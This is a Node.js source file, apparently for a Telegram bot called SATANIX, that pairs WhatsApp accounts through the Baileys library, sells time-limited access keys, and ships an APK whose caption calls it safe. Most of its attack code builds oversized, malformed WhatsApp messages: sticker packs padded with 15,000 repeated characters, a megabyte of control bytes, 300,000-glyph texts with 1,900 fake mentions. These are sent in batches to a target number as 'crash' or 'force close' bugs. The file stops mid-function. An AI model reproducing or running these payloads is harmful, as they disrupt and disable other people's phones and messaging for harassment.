const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";


let userApiBug = null;

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const userPath = path.join(__dirname, "./database/user.json");

//Serve folder statis
app.use(express.static(path.join(__dirname, "public")));
app.use(express.static(path.join(__dirname, "img")));

//✅ Tambahan: route khusus untuk Login.html 
app.get("/login", (req, res) => { 
 res.sendFile(path.join(__dirname, "Login.html")); });

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('@whiskeysockets/baileys');

let sat;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

// --- Fungsi untuk hapus sesi otomatis ---
function removeSession(BotNumber) {
  try {
    const sessionDir = sessionPath(BotNumber);

    // hapus dari map aktif
    if (sessions.has(BotNumber)) {
      try { sessions.get(BotNumber).end(); } catch {}
      sessions.delete(BotNumber);
    }

    // hapus folder auth/device{BotNumber}
    fs.rmSync(sessionDir, { recursive: true, force: true });

    // hapus dari sessions.json
    if (fs.existsSync(file_session)) {
      const data = JSON.parse(fs.readFileSync(file_session));
      const updated = data.filter(n => n !== BotNumber);
      fs.writeFileSync(file_session, JSON.stringify(updated, null, 2));
    }

    console.log(chalk.red(`❌ Sesi ${BotNumber} dihapus (session rusak/tidak aktif).`));
  } catch (err) {
    console.error("Gagal hapus sesi:", err);
  }
}

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sat = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sat.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sat);
          return resolve();
        }
if (connection === "close") {
  const code = lastDisconnect?.error?.output?.statusCode;

  if (code === DisconnectReason.loggedOut) {
    removeSession(BotNumber);
    console.log(`❌ Sesi ${BotNumber} dihapus (logout permanen)`);
return;
  }

  if (code >= 500 && code < 600) {
    return await initializeWhatsAppConnections();
  }

  if (!sat.isConnected && !sat.retryTried) {
    sat.retryTried = true;
    console.log(chalk.yellow(`⏳ Coba ulang koneksi untuk ${BotNumber}...`));
    return await initializeWhatsAppConnections();
  }
  return reject(new Error("Koneksi ditutup"));
}
      });
      sat.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sat = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;
  let retryCounter = 0; 

  sat.ev.on("connection.update", async ({ connection, lastDisconnect }) => {

if (connection === "close") {
  const code = lastDisconnect?.error?.output?.statusCode;

  if (code === DisconnectReason.loggedOut) {
    removeSession(BotNumber);
    console.log(`❌ Sesi ${BotNumber} dihapus (logout permanen)`);
return;
  }

  if (retryCounter < 7) {
    retryCounter++;
    console.log(chalk.yellow(`⏳ Retry ${retryCounter}/7 untuk ${BotNumber}...`));
    return await connectToWhatsApp(BotNumber, chatId, ctx);
  } else {
    console.log(chalk.red(`❌ Gagal koneksi 7 kali, sesi ${BotNumber} dihapus.`));
    removeSession(BotNumber);
    throw new Error(`Sesi ${BotNumber} dihapus setelah 7 kali gagal`);
  }
}
    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sat);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sat.requestPairingCode(BotNumber, "SNITBAIL");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sat.ev.on("creds.update", saveCreds);
  return sat;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});
console.clear();
console.log(chalk.red(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT SATANIX  
├─ ID OWN : ${OwnerId}
├─ BOT : RUNNING... ✅
╰───────────────────`));
initializeWhatsAppConnections();

function owner(userId) {
  return config.owner.includes(userId.toString());
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.command("connect", async (ctx) => {
  const userId = ctx.from.id;
  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);

  }
});

bot.command("buatkey", async (ctx) => {
  try {
    if (!isAuthorized(ctx.from.id)) {
      return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args || !args.includes(",")) {
      return ctx.reply(
        "❗ Format salah.\n" +
        "Contoh: `/buatkey satanix,30d[,admin]`\n" +
        "_username_,_durasi_[,_role_]",
        { parse_mode: "Markdown" }
      );
    }

    const [usernameRaw, durasiStrRaw, roleRaw] = args.split(",");
    const username = usernameRaw.trim();
    const durasiStr = durasiStrRaw.trim();
    const role = (roleRaw || "user").trim().toLowerCase();

    const durationMs = parseDuration(durasiStr);
    if (!durationMs) {
      return ctx.reply("❌ Format durasi salah!\nGunakan contoh: 7d / 1d / 12h");
    }

    const key = generateKey(4);
    const expired = Date.now() + durationMs;

    const users = getUsers();
    const userIndex = users.findIndex(u => u.username === username);

    if (userIndex !== -1) {
      users[userIndex] = { ...users[userIndex], key, expired, role };
    } else {
      users.push({ username, key, expired, role });
    }

    saveUsers(users);

    const expiredStr = new Date(expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });

    const apiBaseUrl = `${process.env.PROTOCOL || "http"}://${VPS}:${PORT}`;

    const msg = [
      "✅ *KEY BERHASIL DIBUAT!*",
      "",
      `📌 *Username:* \`${username}\``,
      `🔑 *Key:* \`${key}\``,
      `👤 *Role:* \`${role}\``,
      `⏳ *Expired:* _${expiredStr}_ WIB`
    ].join("\n");

    await ctx.replyWithMarkdown(msg);

    // Kirim pesan tunggu
    const waitMsg = await ctx.replyWithMarkdown(
      `⏳ *Tunggu beberapa saat, File aplikasi sedang disiapkan...*`
    );

    const path = require("path");

    // Kirim file APK
    await ctx.replyWithDocument(
      { source: path.join(__dirname, "public", "SATANIX.apk") },
      {
        caption: [
          "*ORIGINAL OFFICIAL APPS*",
          "",
          "✅ File ini aman karena langsung dari *Official Developer*.",
          "",
          "📅 *Versi:* 1.0.0",
          "*SATANIX Light Official*"
        ].join("\n"),
        parse_mode: "Markdown"
      }
    );

    // Hapus pesan tunggu setelah file terkirim
    await ctx.deleteMessage(waitMsg.message_id);

  } catch (err) {
    console.error("❌ Error saat membuat key:", err);
    ctx.reply("⚠️ Terjadi kesalahan saat membuat key. Silakan coba lagi.");
  }
});

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    const rawData = fs.readFileSync(filePath, 'utf-8');
    const parsed = JSON.parse(rawData);
    return parsed.map(u => ({
      ...u,
      expired: Number(u.expired) 
    }));
  } catch (err) {
    console.error("❌ Gagal membaca user.json:", err);
    return [];
  }
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');

  const normalizedUsers = users.map(u => ({
    ...u,
    expired: Number(u.expired)
  }));

  try {
    fs.writeFileSync(filePath, JSON.stringify(normalizedUsers, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}


function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');

  if (!fs.existsSync(filePath)) return [];

  try {
    const data = fs.readFileSync(filePath, 'utf-8');
    const parsed = JSON.parse(data);

    if (Array.isArray(parsed)) {
      return parsed;
    }

    if (typeof parsed === 'object' && parsed !== null) {
      return [parsed];
    }

    return [];
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

bot.command("listkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const users = getUsers();
  if (users.length === 0) return ctx.reply("📭 Belum ada key yang dibuat.");

  let teks = `📜 *Daftar Key Aktif:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});


bot.command("delkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const username = ctx.message.text.split(" ")[1];
  if (!username) return ctx.reply("❗ Masukkan username!\nContoh: /delkey satanix");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username \`${username}\` tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);

  ctx.reply(`🗑️ Key milik *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addakses", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa tambah akses!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /addakses <user_id>");

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User sudah punya akses.");
  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Akses diberikan ke ID: ${id}`);
});

bot.command("delakses", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa hapus akses!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delakses <user_id>");

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User tidak ditemukan.");
  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Akses user ID ${id} dihapus.`);
});

bot.command("addowner", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa tambah owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /addowner <user_id>");

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✅ Sudah owner.");
  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`👑 Owner baru ditambahkan: ${id}`);
});

bot.command("delowner", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa hapus owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delowner <user_id>");

  const data = loadAkses();
  if (!data.owners.includes(id)) return ctx.reply("❌ Bukan owner.");
  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Owner ID ${id} berhasil dihapus.`);
});


function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function SqLException(sat, X) {
  const payload = {
    interactiveMessage: {
      contextInfo: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        conversionSource: "porn",
        conversionData: crypto.randomBytes(16),
        conversionDelaySeconds: 9999,
        forwardingScore: 999999,
        isForwarded: true,
        quotedAd: {
          advertiserName: "StX Revolution 👾",
          mediaType: "IMAGE",
          jpegThumbnail: null,
          caption: "SOLO EXPOSED"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        },
        expiration: -99999,
        ephemeralSettingTimestamp: Date.now(),
        ephemeralSharedSecret: crypto.randomBytes(16),
        entryPointConversionSource: "WhatsaApp",
        entryPointConversionApp: "WhatsApp",
        actionLink: {
          url: "t.me/tamainfinity",
          buttonTitle: "action_button"
        },
        disappearingMode: {
          initiator: 1,
          trigger: 2,
          initiatorDeviceJid: X,
          initiatedByMe: true
        },
        groupSubject: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        parentGroupJid: "120363370626418572@g.us",
        trustBannerType: "X",
        trustBannerAction: 99999,
        isSampled: true,
        externalAdReply: {
          title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
          mediaType: 2,
          renderLargerThumbnail: false,
          showAdAttribution: false,
          containsAutoReply: false,
          body: "© T-Яyuichi",
          thumbnail: null,
          sourceUrl: "t.me/tamainfinity",
          sourceId: "9T7A4M1A",
          ctwaClid: "ctwaClid",
          ref: "ref",
          clickToWhatsappCall: true,
          ctaPayload: "ctaPayload",
          disableNudge: true,
          originalImageUrl: null
        },
        featureEligibilities: {
          cannotBeReactedTo: true,
          cannotBeRanked: true,
          canRequestFeedback: true
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
          contentType: 3,
          accessibilityText: "FnX Exposed"
        },
        statusAttributionType: 2,
        utm: {
          utmSource: "XSource",
          utmCampaign: "XCampaign"
        }
      },
      body: {
        text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: `{}`
          }
        ]
      }
    }
  };
try {
    const msg = generateWAMessageFromContent(X, payload, {});
    await sat.relayMessage(X, msg.message, {
      messageId: msg.key.id,
      participant: { jid: X }
    });
  } catch (e) {
    console.error("Error generating message payload:", e);
  }
}
async function Blank(sat, X) {
  await sat.relayMessage(
    X,
    {
      stickerPackMessage: {
        stickerPackId: "S",
        name: "𝑸𝒖𝒊 𝒆́𝒔 𝑺𝒂𝒕𝒂𝒏𝒊𝒙𝒄𝒂𝑳" + "؂ن؃؄ٽ؂ن؃".repeat(15000),
        publisher: "𝑸𝒖𝒊 𝒆́𝒔 𝑺𝒂𝒕𝒂𝒏𝒊𝒙𝒄𝒂𝑳" + "؂ن؃؄ٽ؂ن؃".repeat(15000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "𝑸𝒖𝒊 𝒆́𝒔 𝑺𝒂𝒕𝒂𝒏𝒊𝒙𝒄𝒂𝑳" + "؂ن؃؄ٽ؂ن؃".repeat(15000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: X } });
}
//DELAY FUNCTION\\
async function delayNew(sat, X, mention = true ) {
try {
    let sxo = await generateWAMessageFromContent(X, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "‼️⃟가이𝑺𝒏𝒊𝒕𝒉𝐸𝑥𝟹𝑐.",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
   let sXoMessage = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: X,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const xso = generateWAMessageFromContent(X, sXoMessage, {});
      await sat.relayMessage("status@broadcast", xso.message, {
        messageId: xso.key.id,
        statusJidList: [X],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: X }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500) //sleep nya optional
     if (mention) {
        await sat.relayMessage(X, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: xso.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await sat.relayMessage("status@broadcast", sxo.message, {
        messageId: sxo.key.id,
        statusJidList: [X],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: X }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500);
    if (mention) {
        await sat.relayMessage(X, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: sxo.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
} catch (error) {
  console.error("Error di :", error, "Bodooo");
 }
}


//PEMANGGIL FC\\

async function fcandro(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 1) {
        await Promise.all([
          SqLException(sat, X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/50 Andros 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 900);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
